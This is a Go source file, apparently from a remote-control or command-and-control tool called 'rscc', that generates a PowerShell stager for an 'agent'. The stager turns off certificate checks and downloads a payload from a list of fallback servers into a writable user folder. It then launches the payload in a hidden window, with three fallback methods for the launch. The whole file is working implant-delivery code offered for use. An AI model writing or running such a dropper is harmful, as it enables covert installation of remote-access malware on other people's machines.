package scriptgen

import (
	"bytes"
	"fmt"
	"rscc/internal/database/ent"
	"text/template"
)

var ps1Template = `
$env:PATH += ";C:\Windows\System32;C:\Windows;C:\Windows\System32\WindowsPowerShell\v1.0"

function Download-File {
    param(
        [string]$Url,
        [string]$OutputPath
    )
    
    try {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
        
        try {
            Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UseBasicParsing -TimeoutSec 5 -SkipCertificateCheck -ErrorAction Stop
            return $true
        } catch {
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($Url, $OutputPath)
            $webClient.Dispose()
            return $true
        }
    } catch {
        return $false
    }
}

function Get-SaveDirectory {
    $candidates = @(
        $env:LOCALAPPDATA,
        $env:APPDATA,
        $env:TEMP,
        $env:TMP,
        "$env:USERPROFILE\Downloads"
    )
    
    foreach ($candidate in $candidates) {
        if ($candidate -and (Test-Path $candidate -PathType Container)) {
            try {
                $testFile = Join-Path $candidate "test_write_access.tmp"
                [System.IO.File]::WriteAllText($testFile, "test")
                Remove-Item $testFile -Force
                return $candidate
            } catch {
                continue
            }
        }
    }
    
    return $env:TEMP
}

function Start-BackgroundProcess {
    param(
        [string]$FilePath
    )
    
    try {
        try {
            Write-Host "Starting $FilePath in background"
            Start-Process -FilePath $FilePath -WindowStyle Hidden -PassThru | Out-Null
            return $true
        } catch {
            try {
                $shell = New-Object -ComObject WScript.Shell
                $shell.Run('"' + $FilePath + '"', 0, $false) | Out-Null
                [System.Runtime.Interopservices.Marshal]::ReleaseComObject($shell) | Out-Null
                return $true
            } catch {
                try {
                    $psi = New-Object System.Diagnostics.ProcessStartInfo
                    $psi.FileName = $FilePath
                    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
                    $psi.CreateNoWindow = $true
                    $psi.UseShellExecute = $false
                    $process = [System.Diagnostics.Process]::Start($psi)
                    return $true
                } catch {
                    return $false
                }
            }
        }
    } catch {
        return $false
    }
}

$saveDir = Get-SaveDirectory
$fileName = "{{ .Name }}"
$filePath = Join-Path $saveDir $fileName

$servers = @({{range $index, $server := .Servers}}{{if $index}}, {{end}}"{{$server}}"{{end}})
$urlPath = "{{ .URL }}"

$success = $false

if ($servers.Count -gt 1) {
    foreach ($server in $servers) {
        $url = "https://$server$urlPath"
        if (Download-File -Url $url -OutputPath $filePath) {
            $success = $true
            break
        }
    }
} else {
    if ($servers.Count -gt 0) {
        $url = "https://$($servers[0])$urlPath"
        $success = Download-File -Url $url -OutputPath $filePath
    }
}

if (-not $success -or -not (Test-Path $filePath)) {
    exit 1
}

Write-Host "Downloaded to $filePath"

if (-not (Start-BackgroundProcess -FilePath $filePath)) {
    exit 1
}
`

func GeneratePs1Script(agent *ent.Agent) (string, error) {
	tmpl, err := template.New("ps1").Parse(ps1Template)
	if err != nil {
		return "", fmt.Errorf("failed to parse ps1 template: %w", err)
	}

	buf := bytes.Buffer{}
	if err := tmpl.Execute(&buf, agent); err != nil {
		return "", fmt.Errorf("failed to execute ps1 template: %w", err)
	}

	return buf.String(), nil
}
